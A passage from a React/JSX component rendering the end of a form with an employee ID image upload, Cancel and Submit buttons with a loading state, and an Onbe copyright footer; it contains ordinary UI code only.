              <input ref={empIdRef} type="file" accept="image/jpeg,image/png"
                style={{ display: "none" }}
                onChange={e => { setEmpIdFile(e.target.files?.[0] ?? null); setErrors(p=>({...p,empId:""})); }} />
              <button type="button" onClick={() => empIdRef.current?.click()}
                style={{
                  width: "100%", height: 46, background: "#fafafa",
                  border: `1px dashed ${errors.empId ? "#c00" : "#ccc"}`,
                  borderRadius: 6, cursor: "pointer",
                  display: "flex", alignItems: "center", justifyContent: "center", gap: 8,
                  fontSize: 13, color: empIdFile ? "#111" : "#888", fontWeight: 500,
                }}>
                <Upload size={15} color={empIdFile ? "#111" : "#aaa"} />
                {empIdFile ? empIdFile.name : "Choose File"}
              </button>
              <Err k="empId" />
            </div>
          </div>

          {/* Buttons */}
          <div className="s4-btns">
            <button type="button" onClick={() => navigate("/login")}
              style={{
                height: 44, padding: "0 32px",
                background: "#fff", color: "#555",
                border: "1px solid #ddd", borderRadius: 6,
                fontSize: 14, fontWeight: 500, cursor: "pointer",
              }}>
              Cancel
            </button>
            <button type="submit" disabled={loading}
              style={{
                height: 44, padding: "0 40px",
                background: "#111", color: "#fff",
                border: "none", borderRadius: 6,
                fontSize: 14, fontWeight: 600,
                cursor: loading ? "not-allowed" : "pointer",
                opacity: loading ? 0.7 : 1,
                display: "flex", alignItems: "center", gap: 8,
                letterSpacing: "0.03em",
              }}>
              {loading
                ? <><Loader2 size={16} style={{ animation: "spin 1s linear infinite" }} /> Sending...</>
                : "Submit"}
            </button>
          </div>

        </form>

        <div style={{ textAlign: "center", marginTop: 28 }}>
          <span style={{ fontSize: 11, color: "#ccc" }}>
            &copy; 2026 Onbe, Inc | Terms of Use | Privacy &amp; Cookies
          </span>
        </div>
      </div>
    </div>
  );
}
